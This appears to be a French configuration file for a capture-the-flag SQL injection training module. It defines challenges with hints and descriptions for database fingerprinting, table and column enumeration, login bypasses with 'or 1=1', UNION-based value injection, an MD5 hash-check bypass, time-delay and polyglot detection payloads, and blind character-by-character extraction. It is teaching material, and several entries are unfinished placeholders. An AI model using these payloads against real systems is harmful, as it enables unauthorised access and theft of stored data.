#
# Training : SQLi
#

## avec debug
## avec sortie
## en aveugle

[Intro]
theme: Training
category: TrainSQLi
label: Web: SQLi - 2
docker: ctf-train-sqli
description: 
    ## SQL Injection
    .
    L'exploitation d'injection SQL va du très simple au très compliqué, mais la méthode reste toujours la même:
    .
    <u>Savoir exploiter la base de donnée</u>
    Le langage SQL permet d'écrire des requêtes qui fonctionnent sur la majorité des systèmes.
    Mais pour extraire les informations bas niveau (version, nom des tables, colonnes...), la syntaxe va dépendre de la base de donnée: mysql/mariadb, MS SQL Server, Oracle, PostgreSQL...
    Il faut donc connaitre la syntaxe et les commandes systèmes propres à chaque base de donnée.
    .
    <u>Détecter l'injection</u>
    La détection se fait en remplaçant une valeur par une fonction qui génère cette même valeur, en générant une erreur, ou en injectant  une commande sleep et en constatant le délai.
    .
    <u>Comprendre la requète SQL</u>
    Deviner la syntaxe de la requète SQL pour pouvoir injecter des commandes.
    .
    <u>Injecter une commande</u>
    On peut vouloir forcer un login, ou afficher le contenu d'une base. 
    .
    <u>Bypasser un éventuel filtre</u>
    Les développeurs filtrent généralement les inputs: detection d'espace, de ' ou de "
    Il est parfois possible de contourner ces filtres
    .
    <u>Exploitation des résultats</u>
    Le résultat d'une requète SQL peut être l'affichage de données. Dans ce cas, il faut identifie les champs, leur type, invalider les données légitimes et injecter les données à afficher.
    La requète peut ne rien afficher. Dans ce cas il faut générer des erreurs ou des délais et deviner les données avec des tests logiques.
    .
    De nombreux cheat-sheets existent:
    http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
    https://www.websec.ca/kb/sql_injection#MySQL_Default_Databases
    .
    SQLite:
    SQLite sheet: https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet
                https://thanat0s.trollprod.org/2013/01/sqlite-le-mal-aime-des-sqli/


#
# Requetes MySQL


#
#
# https://localhost/ctf-train-sqli/request_mysql.php
# https://localhost/ctf-train-sqli/request_sqlite.php
[identify_db]
name: SQL: vérifier que la base de donnée est mySQL, et obtenir sa version
category: TrainSQLi
value: 10
flag: 
description: 
    ```
    http://{IP_SERVER}/ctf-train-sqli/request_mysql.php
    http://{IP_SERVER}/IPSERVER/request_sqlite.php
    ```
    Identifier la base de donnée utilisée:
    ```
    MySQL: SELECT @@version
    ```



[list_db]
name: Lister les databases
value: 10
category: TrainSQLi
flag:   
hint: aa' UNION SELECT name FROM  sqlite_master  WHERE  type ='table' AND  name NOT LIKE 'sqlite_%';
description: 
    xxxx


[list_tables]
name: Lister les tables
value: 10
category: TrainSQLi
flag:   
hint: aa' UNION SELECT name FROM  sqlite_master  WHERE  type ='table' AND  name NOT LIKE 'sqlite_%';
description: 
    xxxx




[list_columns]
name: Lister les colonnes d'une table
value: 10
category: TrainSQLi
flag:   
hint: aa' union SELECT name FROM PRAGMA_TABLE_INFO('users');
description: 
    un nom par row, les noms concaténés



[dump_table]
name: Afficher le contenu d'une table
value: 10
category: TrainSQLi
flag:   
hint: aa' union SELECT name FROM PRAGMA_TABLE_INFO('users');
description: 
    xxxx




#
# Detection
#


#
# polyglot
# SLEEP(3) /*' or SLEEP(3) or '" or SLEEP(3) or "*/



#
# Injection
# 
[type_req]
name: Types de requètes SQL classiques à base de SELECT
value: 10
category: TrainSQLi
flag:   
description: 
    Input de type int
    ```
    SELECT * from users WHERE id=ARG1
    ```
    Input de type string
    ```
    SELECT id, name, password from users WHERE name='ARG1'
    ```
    Plusieurs arguments
    ```
    SELECT id, name, password from users WHERE name='ARG1' and password='ARG2'
    ```

[detect_int]
name: Detection sur paramètre de type int
value: 10
category: TrainSQLi
flag:   
description: 
    ```
    1 => SELECT * from users WHERE id=1
    ```
    Effectuer un calcul et vérifier que le résultat ne change pas
    ```
    0+1 => SELECT * from users WHERE id=0+1
    ```
    Générer une erreur
    ```
    1" => SELECT * from users WHERE id=1"
    SELECT * from users WHERE id=1'
    SELECT * from users WHERE id=1')
    ```
    Générer un delai
    ```
    CAST(substr(upper(hex(randomblob(99999999))),0,1) as INTEGER)+1
    ```


[detect_string]
name: Detection sur paramètre de type string
value: 10
category: TrainSQLi
flag:   
description: 
    ```
    max => SELECT * from users WHERE login='max'
    ```
    Concaténer deux strings et vérifier que le résultat ne change pas
    ```
    SQLite: m'||'ax => SELECT * from users WHERE login='m'||'ax'
    ```
    Générer une erreur
    ```
    SELECT * from users WHERE id=max"
    SELECT * from users WHERE id=max'
    SELECT * from users WHERE id=max')
    ```
    Générer un delai. La valeur start valant 0, substr retourne une string nulle.
    ```
    SQLite: max' || substr(upper(hex(randomblob(99999999))),0,1)
    ```



[detect_delay]
name: Détecter un sqli avec un délai 
value: 10
category: TrainSQLi
flag:   
description: 
    ```
    1 or  => SELECT * from users WHERE id=1
    ```

#
# Login page
# 

[force_login]
name: Forcer une authentification en injectant des entrées de la base: or 1=1
value: 10
category: TrainSQLi
flag:   
hint: aa' or 1=1  
description: 
    xxxx


[force_first_entry]
name: Forcer une authentification en injectant la première entrée de la base: or 1=1 LIMIT 1
value: 10
category: TrainSQLi
flag:  
hint: aa' or 1=1 LIMIT 1  -- - 
description: 
    xxxx


[choose_existing_entry]
name: Forcer une authentification en injectant une entrée choisie de la base: or 1=1 LIMIT 1 OFFSET 1
value: 10
category: TrainSQLi
flag:  
hint: aa' or 1=1 LIMIT 1 OFFSET 1  -- - 
description: 
    xxxx



[inject_entry]
name: Forcer une authentification en injectant une valeur: and 1=0 union select 'admin'
value: 10
category: TrainSQLi
flag:   
hint: aa' and 1=0 UNION SELECT 'bob'
description: 
    xxxx



[guess_fields_number]
name: Forcer une authentification en injectant une valeur, determiner le nombre de champs de la requète: UNION SELECT 1,2,3,4
value: 10
category: TrainSQLi
flag:   
hint: UNION SELECT 1,2,3,4
description: 
    xxxx


[inject_login_passwd]
name: Forcer une authentification en injectant login et passwd md5 
value: 10
category: TrainSQLi
flag:   
hint: UNION SELECT 1,2,3,4
description: 
    #Bypassing MD5 Hash Check Example (MSP)
    #Username :admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
    #Password : 1234
    #81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234)


#
# Product display
#

#
# Blind injection
# Trouver un login qui fonctionne
# SELECT * from users WHERE login='admin'-- -
# Trouver un login qui fonctionne pas
# SELECT * from users WHERE login='yolo'-- -
# Ajouter des conditions pour forcer un true
# SELECT * from users WHERE login='yolo' union SELECT 1,1,1 FROM users WHERE login='admin' AND+length(password)>30-- -
# Trouver la longueur du champ
# SELECT * from users WHERE login='yolo' union SELECT 1,1,1 FROM users WHERE login='admin' AND+length(password)>30-- -
# Tester char par char
# AND+substring(password,1/*pos*/,1/*len*/)='a'
# yolo' or substring(login,1/*pos*/,3/*len*/)='adm'-- -

#
# Injection de header HTTP
#


[inject_http_header]
name: Injecter via un header HTTP
value: 10
category: TrainSQLi
flag:   
description: 
    curl xxx

